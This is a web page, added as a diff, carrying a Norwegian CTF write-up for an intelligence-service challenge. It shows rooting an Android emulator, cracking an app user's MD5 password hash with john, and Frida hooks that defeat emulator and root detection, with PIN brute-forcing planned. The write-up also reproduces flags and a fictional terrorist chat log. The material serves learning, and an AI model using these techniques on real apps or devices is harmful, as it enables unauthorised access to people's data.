@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>BASHGOBRR</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <link rel="icon" href="//favicon.ico">
+    <link rel="canonical" href="/">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="/">BASHGOBRR</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>Cybertalent21: part 2 - Sat, Jan 16, 2021.
+        
+          
+              
+              
+                  <a href="/categories/ctf-writeup/" data-rel="prefetch">Ctf Writeup</a>
+              
+          
+        </h1>
+
+    </div>
+        
+        <ul id="tags">
+            
+                
+                
+                    <a href="/tags/ctf/" data-rel="prefetch">CTF</a>
+                
+            
+                
+                
+                    <a href="/tags/etj/" data-rel="prefetch">ETJ</a>
+                
+            
+                
+                
+                    <a href="/tags/android/" data-rel="prefetch">Android</a>
+                
+            
+                
+                
+                    <a href="/tags/ibm-z/os/" data-rel="prefetch">IBM z/OS</a>
+                
+            
+        </ul>
+        
+        <ul id="series">
+            
+                Series:
+                
+                
+                    <a href="/series/cybertalent21/" data-rel="prefetch">Cybertalent21</a>
+                
+            
+        </ul>
+    <p class="lead">CTF for the Norwegian Intelligence Service (Etterretningstjenesten), the writeup is in norwegian as I am too lazy to translate. This is the second part of a 3-part series about this CTF.</p>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#2_oppdrag">2_oppdrag</a>
+      <ul>
+        <li><a href="#situasjon">Situasjon</a></li>
+        <li><a href="#intrep">INTREP</a></li>
+        <li><a href="#beslag">Beslag</a>
+          <ul>
+            <li><a href="#tuner">Tuner</a></li>
+            <li><a href="#chat">Chat</a></li>
+            <li><a href="#vault">Vault</a></li>
+          </ul>
+        </li>
+        <li><a href="#seatheworld">Seatheworld</a>
+          <ul>
+            <li><a href="#dns">DNS</a></li>
+            <li><a href="#booking">Booking</a></li>
+            <li><a href="#ekstra">Ekstra</a></li>
+          </ul>
+        </li>
+        <li><a href="#scada">Scada</a>
+          <ul>
+            <li><a href="#onion">Onion</a></li>
+            <li><a href="#aksess">Aksess</a></li>
+            <li><a href="#gissel">Gissel</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <p>Sist gikk vi igjennom grunnleggende oppgaver:
+<strong><a href="/post/etj21_1/">Forrige DEL</a></strong></p>
+<h2 id="2_oppdrag">2_oppdrag</h2>
+<h3 id="situasjon">Situasjon</h3>
+<p>Vi har mottatt en etterretningsrapport (INTREP) som krever umiddelbar oppmerksomhet.
+Rapporten ligger vedlagt.</p>
+<h3 id="intrep">INTREP</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">16 13:37Z DES 2020, INTREP
+GRADERING:     TEMMELEG HEMMELEG
+VÅR REFERANSE: SNTA1337N
+PRIORITET:     KRITISK // FLASH
+
+1. SITUASJONSSKILDRING
+
+EI GRUPPE TERRORISTAR HAR I LØPET AV NATTA 16. DESEMBER TATT EIT
+UKJEND TAL PÅ GISSEL OM BORD PÅ DET NORSKE FORSKINGSFARTYET MS
+KOLDBJORN.  FARTYET VAR PÅ VEG TIL FORSKINGSBASEN TROLL, MEN HAR STÅTT
+FAST I ISEN 177 NAUTISKE MIL NORD-AUST FOR BASEN SIDAN 30. NOVEMBER.
+
+BAK AKSJONEN STÅR HØGST TRULEG PERSONAR KNYTTA TIL UTANLANDSKE
+SEPARATISTGRUPPERINGAR SOM YNSKJER Å UNDERGRAVE NORSK SUVERENITET OVER
+DRONNING MAUD LAND.  DET VART, RETT FØR AKSJONEN, RINGT INN TRUSLAR OM
+KONKRETE HANDLINGAR I NÆR FRAMTID.
+
+EIN PERSON SOM KAN KNYTTAST TIL ÅTAKET VART STOPPA AV EI SAMARBEIDANDE
+TENESTE GRUNNA MISTENKELEG ÅTFERD.  I AVHØYR HAR PERSONEN INNRØMMA Å
+VERA EIN DEL AV GRUPPA &#34;FREE ANTARCTICA&#34;, MEN PERSONEN VART SLEPPT FRI
+ETTER AVHØYR OG HAR REIST VIDARE TIL UKJEND STAD.  PERSONEN HAR TRULEG
+REIST MED FALSKT NAMN.
+
+AV DI DET KUN GÅR TO (2) ORDINÆRE RUTEFLY TIL OMRÅDET I ÅRET ER DET
+TRULEG AT GISSELTAKARANE KOM TIL FARTYET VIA TROLL INTL AIRPORT (TXA)
+FRÅ AMSTERDAM AIRPORT SCHIPHOL (AMS) DEN 14. DESEMBER.
+
+EITT ELLER FLEIRE GISSEL ER OM BORD PÅ MS KOLDBJORN UTANFOR DRONNING
+MAUD LAND.  SITUASJONEN ER UOVERSYNLEG.
+
+2. GRUNNLAGSETTERRETNING
+
+DET FINS LITE GRUNNLAGSETTERRETNING OM ORGANISASJONAN(E) ME REKNAR MED
+STÅR BAK.  ME HAR OVER LENGRE TID FYLGT SEPARATISTGRUPPERINGAR SOM
+YNSKJER EIT FRITT OG SJØLVSTENDIG ANTARKTIS, MEN ME HAR IKKJE VURDERT
+AT DEI VIL VERA I STAND TIL Å UTFØRA VALDELEGE ÅTAK.  ME ER KJEND MED
+TO GRUPPERINGAR SOM TRULEG KAN STÅ BAK:
+
+    (1) ANTARKTIS OG FRIDOM (AF)
+    (2) FREE ANTARCTICA
+
+ORGANISASJONANE HAR OVER FLEIRE ÅR NYTTA REISEOPERATØREN &#34;SEA THE
+WORLD&#34;, SOM OPERERER FRÅ FYRSTEDØMET SEALAND, FOR Å LEGGJA TIL RETTE
+FOR REISEVERKSEMDA.  OPERATØREN ER ILLGJETEN, DÅ DEI IKKJE GODTAR PASS
+SOM LEGITIMASJON, MEN HELLER SVER PÅ &#34;MOR OG FAR I DØDEN&#34;.  OPERATØREN
+AKSEPTERER KUN KRYPTOVALUTA, OG ME SER IKKJE VEKK FRÅ AT
+REISEOPERATØREN ER EIT DEKKSELSKAP FOR NEMNTE GRUPPERINGAR.
+OPERATØREN HAR SLÅTT SEG OPP VED Å KAPRA OG RØVA NORSKE SKIP SOM
+FRAKTAR KASSERT EDB-UTSTYR FOR EI REKKE NORSKE SELSKAP.
+
+3. OPPDRAG
+
+PRIORITERINGANE VÅRE ER:
+
+    (1) FRIGJEVA GISSELET ELLER GISSELA
+    (2) IDENTIFISERE GISSELTAKARANE
+    (3) HALDA FAST PÅ NORSK SUVERENITET OVER DRONNING MAUD LAND
+
+4. KVERRSETJING
+
+EI SAMARBEIDANDE TENESTE HAR KVERRSETT FLEIRE TELEFONAR OG MINNEKORT
+DISPONERT AV PERSONEN SOM VART AVHØYRT. DEI HAR OGSÅ FANGA NOKO
+TRAFIKK FRÅ EIN AV TELEFONANE.
+
+DET ER FØREBELS IKKJE GJORT ANALYSE AV KVERRSETJINGA.
+
+SLUTT
+</code></pre></div><p>Vi får en dump av android mobilen hans + en pcap fil med trafikk fra mobilen.</p>
+<h3 id="beslag">Beslag</h3>
+<p>Vi trenger å kunne emulere ett android system og laste inn phone dumpen.
+Jeg har ingen erfaring med android, så dette er en god mulighet til å lære noe nytt.
+Velger å bruke <a href="https://developer.android.com/studio/run/emulator">Android Studio Emulatoren</a>.</p>
+<p>Nyttige exports for å kunne kjøre android toolsa overalt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export ANDROID_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$HOME<span style="color:#e6db74">/Android/Sdk&#34;</span>
+export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>PATH<span style="color:#e6db74">}</span>:$ANDROID_HOME/emulator:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
+export JAVA_HOME<span style="color:#f92672">=</span>/usr/lib/jvm/java-8-openjdk
+export ANDROID_STUDIO<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$HOME<span style="color:#e6db74">/builds/android-studio&#34;</span>
+export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>PATH<span style="color:#e6db74">}</span>:$ANDROID_STUDIO/bin
+
+</code></pre></div><p>Lager en Virtual Device:</p>
+<p><img src="/img/android.png" alt="android"></p>
+<p>Følger denne guiden for å <a href="https://github.com/0xFireball/root_avd">roote devicen</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># starter emulatoren</span>
+emulator -avd RootPixelPie -writable-system -selinux permissive -qemu -enable-kvm
+
+<span style="color:#75715e"># kommandoer for å roote</span>
+❯ adb root
+restarting adbd as root
+❯ adb remount
+remount succeeded
+❯ adb install root_avd/SuperSU/common/Superuser.apk
+Performing Streamed Install
+Success
+❯ adb push root_avd/SuperSU/x86/su /system/xbin/su
+root_avd/SuperSU/x86/su: <span style="color:#ae81ff">1</span> file pushed, <span style="color:#ae81ff">0</span> skipped. 125.4 MB/s <span style="color:#f92672">(</span><span style="color:#ae81ff">253796</span> bytes in 0.002s<span style="color:#f92672">)</span>
+❯ adb shell chmod <span style="color:#ae81ff">0755</span> /system/xbin/su
+❯ adb shell su --install
+❯ adb shell su --daemon&amp;
+
+<span style="color:#75715e"># tcpdump fra devicen</span>
+❯ emulator -tcpdump dump.pcap -avd <span style="color:#e6db74">&#39;RootPixelPie&#39;</span> -writable-system -selinux permissive -qemu -enable-kvm
+
+<span style="color:#75715e"># http-proxy burpsuite, må installere CA for https</span>
+❯ emulator -http-proxy localhost:8080 -avd <span style="color:#e6db74">&#39;RootPixelPie&#39;</span> -writable-system -selinux permissive -qemu
+</code></pre></div><p>Installere <a href="https://docs.mitmproxy.org/stable/howto-install-system-trusted-ca-android/">root CA</a> for å kunne sniffe trafikk fra alle apper.</p>
+<p>I phone dumpen finner vi en APK, altså en andoird app. Vi ønsker å sjekke denne ut.
+Vi kan installere APK&rsquo;en med <a href="https://developer.android.com/studio/command-line/adb">Andoird Debug Bridge</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯ adb install ~/ctf/e-tjenesten/cybertalentet20/2_oppdrag/phone_dump/sdcard/Download/lt3000.apk
+Performing Streamed Install
+Success
+</code></pre></div><p><img src="/img/liberator.png" alt="liberator"></p>
+<p>Appen har tre funksjonaliteter, Tuner, Chat og Vault.
+Vi ser først på tuner:</p>
+<h4 id="tuner">Tuner</h4>
+<p>Trykker vi videre inn på tuner får vi opp ett innloggingsskjema og en dial med 9 kanaler der alle bare gir støy.
+I phone dumpen er det en data-mappe:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">data
+└── data
+    └── no.cybertalent.liberatortoolkit
+        ├── databases
+        │   └── users.db
+        ├── files
+        │   └── data.bin
+        └── shared_prefs
+            ├── ChatActivity.xml
+            └── VaultActivity.xml
+</code></pre></div><p>Tipper det er noe nyttig i users.db. Laster opp en SQLite browser og henter ut følgende:</p>
+<ul>
+<li>username:hungry_hippo_123</li>
+<li>firstname:Frank</li>
+<li>lastname:Shorius</li>
+<li>password_hash:2034F6E32958647FDFF75D265B455EBF</li>
+</ul>
+<p>Bruker john the ripper for å cracke passordhashen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯ john --wordlist<span style="color:#f92672">=</span>../../../../ordliste/rockyou.txt pass_lower.txt --format<span style="color:#f92672">=</span>Raw-MD5
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Raw-MD5 <span style="color:#f92672">[</span>MD5 128/128 AVX 4x3<span style="color:#f92672">])</span>
+Warning: no OpenMP support <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+secretpassword
+</code></pre></div><p>Logger inn med &ldquo;hungry_hippo_123&rdquo; og &ldquo;secretpassword&rdquo;. I en av radiokanalene forteller en robotstemme hva flagget er.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ scoreboard london_calling
+Kategori: 2. Oppdrag
+Oppgave:  2.1_beslag_1
+Svar:     london_calling
+
+Bra jobbet!
+Det hadde vært praktisk om vi visste hvordan de har kommunisert.
+</code></pre></div><p>Vi går videre til Chat.</p>
+<h4 id="chat">Chat</h4>
+<p><img src="/img/chat.png" alt="chat"></p>
+<p>Hvis vi går til mobile.cybertalent.no finner vi enda ett innloggingsskjema, samme credentials gjelder her også.</p>
+<p><img src="/img/chat_chall.png" alt="chat_chall"></p>
+<p>Hvert 10ende sekund kommer det en ny lang kode, det er umulig å skrive inn koden raskt nok for hånd.
+Her trengs det et dypere dykk i hvordan APK&rsquo;en er bygd opp.</p>
+<h5 id="nyttige-verktøy">Nyttige verktøy:</h5>
+<ul>
+<li><a href="https://ibotpeaches.github.io/Apktool/">apktool</a>: Disassembler APK til nesten orginale ressurser: .dex, XMLs og SMALI</li>
+<li><a href="https://github.com/pxb1988/dex2jar">dex2jar</a>: Fra .dex og .apk til .jar filer.</li>
+<li><a href="http://java-decompiler.github.io/">jd-gui</a>: Grafisk grensesnitt for å produsere Java kode fra .class filer</li>
+<li><a href="https://github.com/skylot/jadx">jadx-gui</a>: Produserer Java kode fra APK eller dex filer</li>
+</ul>
+<p>Bruker hovedskalig jadx-gui for å bli mer kjent med appen.</p>
+<p>Ser igjennom den genererte Java koden. Klassen &ldquo;ChatActivity&rdquo; importerer &ldquo;ChatHelper&rdquo;, der finnes det en metode som heter getResponse.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">getResponse</span><span style="color:#f92672">(</span>String str<span style="color:#f92672">);</span>
+</code></pre></div><p>Denne metoden er static native (JNI). Dvs. metoden blir kalt fra en lib fil <a href="https://stackoverflow.com/questions/6101311/what-is-the-native-keyword-in-java-for">JNI</a>. Bruker apktool for å hente ut ressursene, og finnner lib filen: lib/X86_64/libnative-lib.so</p>
+<p>Jeg begynner så og reversere binærfilen for å finne ut hvordan response-koden genereres fra challengen gitt fra mobile.cybertalent.no.
+Vi fyrer opp Ghidra:</p>
+<p><img src="/img/lib_reversing.png" alt="lib_reversing"></p>
+<p>Det skjer noe xor&rsquo;ing med GMT time og minutt, dvs. koden vil endre seg hvert minutt som går med samme input.
+Videre kan vi se en sjekk som legger til &ldquo;deadbeef&rdquo; i linjene 50 - 53. &ldquo;deadbeef&rdquo; brukes ofte til å debugge program med, og det virker som den sjekken er viktig. Tilbake i appen kan vi prøve å kalle på metoden.
+Hvis vi skriver inn en challenge med &ldquo;/response AAAAAAAAAAAAAAAAAAAAA&rdquo; får vi tilbake en en responsekode på formen &ldquo;a1deadbeefadadadadadadadadadadadadadadadad&rdquo;, det eneste som endrer seg er tegnene etter &ldquo;a1deadbeef&rdquo;.
+Hvis vi følger bvar8 oppover i koden til linje 24 kan vi se at sjekken er avhengig av hva som er i &ldquo;emu&rdquo; og &ldquo;Z&rdquo;.
+De variabelnavnene finner vi i &ldquo;ChatHelper&rdquo; klassen:</p>
+<p><img src="/img/emu.png" alt="emu"></p>
+<p>Formålet for disse boolske variablene er å sjekke om appen kjøres på en emulert device. Med dette i tankene prøver jeg først å reversere response-algoritmen med utgangspunkt i at &ldquo;emu&rdquo; og &ldquo;z&rdquo; er false. Tanken var at dersom jeg fikk reversert algoritmen var det lett å skrive et python-script for å automatisk svare på challengen. Jeg prøver dette i et par dager uten noe hell. I steden for å reversere prøver jeg heller å manipulere metodekallene direkte i applikasjonen med <a href="https://frida.re/docs/android/">Frida (setup for android)</a>.</p>
+<p>Kommer til slutt med en løsning ved bruk av noen nyttige <a href="https://erev0s.com/blog/frida-code-snippets-for-android/">snippets for frida</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> frida
+<span style="color:#f92672">import</span> requests
+
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://mobile.cybertalent.no/getchall&#34;</span>)
+chall <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;chall&#34;</span>]
+print(<span style="color:#e6db74">&#34;Chall:&#34;</span>, chall)
+
+jscode <span style="color:#f92672">=</span> (
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">Java.perform(function x() {
+</span><span style="color:#e6db74">  var someClass = Java.use(
+</span><span style="color:#e6db74">    &#34;no.cybertalent.liberatortoolkit.helpers.ChatHelper&#34;
+</span><span style="color:#e6db74">  );
+</span><span style="color:#e6db74">  var inst = someClass.$new();
+</span><span style="color:#e6db74">  inst.emu.value = false;
+</span><span style="color:#e6db74">  console.log(inst.getResponse(&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;).toLowerCase());
+</span><span style="color:#e6db74">});
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+    <span style="color:#f92672">%</span> chall
+)
+
+process <span style="color:#f92672">=</span> frida<span style="color:#f92672">.</span>get_usb_device()<span style="color:#f92672">.</span>attach(<span style="color:#e6db74">&#34;no.cybertalent.liberatortoolkit&#34;</span>)
+script <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>create_script(jscode)
+print(<span style="color:#e6db74">&#34;[*] Response:&#34;</span>)
+script<span style="color:#f92672">.</span>load()
+</code></pre></div><p>Her bruker vi kaller vi &ldquo;getResponse&rdquo; med nyeste challenge og setter emu til false manuelt for å få en gyldig kode vi kan skrive inn. Logger inn i chat med token fra mobile.cybertalentet.no og får tilgang:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">############################################
+#      Welcome to the #LT3000 chat.        #
+#                                          #
+# * Use at own risk.                       #
+# * All comms are encrypted.               #
+# * Please do not use real names.          #
+# * Have fun!                              #
+#                                          #
+############################################
+
+
+3 users currently online.
+
+FLAG: 04907eee5386072670b5107b744b2f8481294377
+
+--- Day changed 02 DES 2020 ---
+
+[09:04] B4tCracK: Hi every1, i read that SecureChat was bought by some megacorp, don&#39;t think it&#39;s safe anymore. let&#39;s talk here instead
+[09:40] RADAR: willco
+[09:46] eireen89: You made this thing all by yourself?
+[10:24] B4tCracK: just some stuff i had lying around from another project no big deal
+[10:24] B4tCracK: it encrypts stuff six times, might be a bit slow
+[11:23] RADAR: Wow, proper nation-state crypto stuff or what?
+[11:57] eireen89: Hey, RADAR, remember: We&#39;re a proper nation-state too! Or at least we should be!
+
+--- Day changed 03 DES 2020 ---
+
+[14:35] hungry_hippo_123: Where did you go? I sent lots of securechats but noone answered
+[14:56] hungry_hippo_123: when did we change apps???
+[15:31] RADAR: Uhoh, hungry_hippo_123 BOHICA
+[16:00] hungry_hippo_123: ??
+[16:01] eireen89: Seriously, hungry_hippo_123. You have to take communication seriously, and read your messages.
+[16:49] hungry_hippo_123: yeah yeah
+[16:51] hungry_hippo_123: but whats happening?
+[16:52] eireen89: This fight is grand er than us and each one of us. Ask of yourselves: Are you in it for Antarctica, or just to avoid boredom?
+[17:52] eireen89: The world is changing before our very eyes, and we must take a stand!
+[17:53] eireen89: Just read this shit: https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;nv=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=auto&amp;sp=nmt4&amp;tl=en&amp;u=https://www.regjeringen.no/no/dokumenter/meld.-st.-32-20142015/id2415997/sec6%3Fq%3DAntarktis
+[18:08] RADAR: Oh, we&#39;re in! Into the abyss, and beyond!
+[18:23] hungry_hippo_123: Into the abyss!!
+[18:23] hungry_hippo_123: &lt;hipsThor.jpg&gt;
+[19:57] B4tCracK: im gone for ten minutes, and all of a sudden you&#39;re talking about the abyss. Maybe chill a little?
+[20:48] eireen89: Let&#39;s begin with a trip to magnificent Antarctica!
+[20:55] hungry_hippo_123: &lt;okayDen.jpg&gt;
+[21:21] B4tCracK: Sitting ducks on koldbjorn around here: https://www.google.com/maps/@-70.6927673,-0.2845782,14.8z
+
+--- Day changed 04 DES 2020 ---
+
+[00:26] B4tCracK: I have devised a cunning method to book flight tickets anonymously. Our names will not show up anywhere except in the Sea the World systems.
+[00:56] RADAR: W00t w00t
+[01:28] B4tCracK: Yeah, I knew investing in this &#34;relationship&#34; would come in handy some day!
+[01:29] B4tCracK: Just logged in myself to check, and status is CONFIRMED. IT IS FINALLY HAPPENING!
+[02:01] eireen89: Excellent! It&#39;s getting closer now. Can you hear the people sing?
+[02:02] hungry_hippo_123: &lt;troll_face.jpg&gt;
+[03:01] RADAR: Speaking bout tickets
+[03:01] RADAR: do we have a lock on the target yet?
+[03:02] RADAR: Oh and we need a codename! How about &#34;Hummingbird&#34;
+[04:40] eireen89: It is getting closer, now that we finally can get air tickets, the target can be some hot-shot norwie
+[04:47] eireen89: Maybe someone who runs those subsea facilities
+[05:14] hungry_hippo_123: We need a cooler name than hummingbird
+[05:14] hungry_hippo_123: More action!!
+[06:26] B4tCracK: There should be some adjective
+[07:08] RADAR: Uh, isn&#39;t tactical stuff my responsibility, not yours?!
+[07:09] B4tCracK: Operation FISHY PELICAN
+[07:10] hungry_hippo_123: No, EXPLODING something!!
+[07:11] B4tCracK: EXPLODING HUMMINGBIRD
+[08:05] RADAR: OK, that one&#39;s actually good. OORAH!
+[08:11] eireen89: And now back to your assignments. We have more important stuff to consider.
+
+--- Day changed 05 DES 2020 ---
+
+[09:04] eireen89: OMG OMG OMG
+[09:40] hungry_hippo_123: ??
+[09:46] RADAR: Sitrep
+[10:24] eireen89: I think they are onto us
+[11:09] hungry_hippo_123:  &lt;southpole_pepe.gif &gt;
+[11:23] eireen89: You know that blue dot on the map? When I opened maps now it was on the other side of the ocean in you know where
+[11:57] B4tCracK: you think someone is using your account? Which password manager are you using?
+[12:42] eireen89: Uh, dunno about manager, I use my regular password???
+[13:32] B4tCracK: what do you mean? to open your password manager?
+[13:45] hungry_hippo_123:  &lt;success_kid.jpg &gt;
+[14:35] eireen89: I don&#39;t understand
+[14:56] B4tCracK: guys? you DO focus on OPSEC, right???
+[15:31] hungry_hippo_123: On what?
+[16:00] eireen89: Our group is not concerned with OPEC.
+[16:01] B4tCracK: jfc we must go in cleanup mode ASAP
+[16:49] hungry_hippo_123:  &lt;galaxy_brain_norwegian.png &gt;
+[16:51] eireen89: OK? well, we must do everything to secure the operation. It&#39;s not much time left
+[16:52] eireen89: We can not falter now!
+[17:09] B4tCracK: so then we need to stop all comms until i&#39;ve had a look at your phones
+[17:10] RADAR: willco
+[18:08] hungry_hippo_123:  &lt;this_is_fine.jpg &gt;
+
+--- Day changed 06 DES 2020 ---
+
+[00:05] hungry_hippo_123:  &lt;erna_solberg_vader.jpg &gt;
+[00:06] hungry_hippo_123:  &lt;deathstar_verdal.jpg &gt;
+[00:07] hungry_hippo_123: You guys, have you seen this funny names???!!
+[00:07] hungry_hippo_123:  &lt;macdonald_berger.png &gt;
+[01:43] hungry_hippo_123:  &lt;kashRegister.jpeg &gt;
+[03:59] hungry_hippo_123:  &lt;moeLester.jpg &gt;
+[04:51] eireen89: It&#39;s 04:51
+[04:56] hungry_hippo_123: and?
+[04:57] hungry_hippo_123:  &lt;norway_frigate_sinking_4k.jpg &gt;
+[05:01] B4tCracK: do you REMEMBER that we agreed not to use this channel until i&#39;ve cleared it???
+
+--- Day changed 07 DES 2020 ---
+
+[08:27] hungry_hippo_123: btw can&#39;t find my booking reference
+[09:02] RADAR: Hey full radio silence NEWB
+[09:44] B4tCracK: nah its fine.
+[09:47] hungry_hippo_123: Do I need the reference thingy??
+[10:14] B4tCracK: ive examined the traffic pcaps and the app is safe
+[10:48] hungry_hippo_123:  &lt;overly_attached_norwegian.jpg &gt;
+[11:26] B4tCracK: and duh, yeah, you need the reference. i got it here two secs
+[12:08] B4tCracK: WJWQX
+[13:20] hungry_hippo_123: &lt;leo_dicaprio_thank_you.jpeg&gt;
+[13:37] RADAR: Hey b4tCracK: while you checked the traffic, did you check that travel system, too?
+[13:38] eireen89: Everyone ready for tomorrow?
+[14:05] hungry_hippo_123:  &lt;distractedBoyfriend_Antarctica.png &gt;
+[14:56] B4tCracK: yeah, some old crap that system
+[14:56] B4tCracK: good thing for us
+[15:00] eireen89: And the cold meadows of Antarctica shall be watered by the tears of greedy weegie bastards!
+[15:03] eireen89: Let&#39;s hope we will never see Norwegian exploitation expand to our part of the continental shelf again
+[15:04] RADAR: Let OPERATION EXPLODING HUMMINGBIRD begin!
+[18:27] B4tCracK: for future reference; your username to the backdoor is the first three letters of your first name followed by the
+[18:27] B4tCracK: length of your username here and ending with your last name. The capital letters of your name stays capital.
+[18:27] B4tCracK: I will NOT repeat this, and do NOT, I repeat; DO NOT write it down!
+
+--- Day changed 08 DES 2020 ---
+
+[11:09] RADAR: FUBAR! My man at the airport says hungry_hippo_123 was taken away by security
+[11:23] eireen89: Alas! A martyr for a just cause.
+[11:24] eireen89: Certainly a doofus, but also a martyr.
+[12:42] B4tCracK: FSCK! we need to clean up! for real this time. switch to secondary comms!
+[13:32] eireen89: Wait, what, why?
+[13:45] B4tCracK: if the state got their hands on him, it means THEY HAVE HIS PHOne and CAN READ THIS
+[14:35] RADAR: SELF DESTRUCT SELF DESTRUCT
+[14:56] eireen89: OK, discard your phones. But the kidnapping shall procede.
+[01:01] l4m3r: .response aaaaaa
+[01:01] l4m3r: t
+[13:26] hungry_: i am back
+[18:23] l4m3r:
+[18:23] l4m3r:
+[18:27] l4m3r: /response 2
+[18:34] l4m3r: a
+[21:52] l4m3r: whomai
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ scoreboard 04907eee5386072670b5107b744b2f8481294377
+Kategori: 2. Oppdrag
+Oppgave:  2.1_beslag_2
+Svar:     04907eee5386072670b5107b744b2f8481294377
+
+Flott! Nå vet vi litt mer om gisseltakerne.
+Ligger det noen interessante filer eller tekniske spor her også?
+</code></pre></div><h4 id="vault">Vault</h4>
+<p>I vault kan vi skrive inn en fire siffret pin for å kryptere/dekryptere notater. Først har appen ingen notater, men vi kan laste opp krypterte notater fra sd-kortet gitt i dumpen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd phone_dump/sdcard/Android/data/no.cybertalent.liberatortoolkit/files
+adb push * /sdcard/Android/data/no.cybertalent.liberatortoolkit/files
+
+<span style="color:#75715e"># Låser vaultet med riktig pin</span>
+cd phone_dump/data/data/no.cybertalent.liberatortoolkit/shared_prefs
+adb push * /data/data/no.cybertalent.liberatortoolkit/shared_prefs
+</code></pre></div><p>Bruker mye tid på denne oppgaven på diverse rabbitholes som jeg ikke trenger å skrive om her, men jeg løste denne parallelt med Chat og det var først når jeg brukte Frida at jeg fikk løst den. Isteden for å sjekke om systemet er emulert har vi en klasse som heter &ldquo;CheckHelper&rdquo; som sjekker om devicen er rootet. Vi kan hooke metoden med frida og returnere false manulet hver gang den kalles. Videre kan vi bruke Frida til å brute-force pinnen som trengs for å dekryptere innholdet i Vault.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">setTimeout(function () {
+  <span style="color:#f92672">//</span> avoid java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>ClassNotFoundException
+
+  Java<span style="color:#f92672">.</span>perform(function () {
+    <span style="color:#f92672">//</span> Root detection bypass
+    var root_hook <span style="color:#f92672">=</span> Java<span style="color:#f92672">.</span>use(
+      <span style="color:#e6db74">&#34;no.cybertalent.liberatortoolkit.helpers.CheckHelper&#34;</span>
+    );
+    var context <span style="color:#f92672">=</span> Java<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#34;android.content.Context&#34;</span>);
+
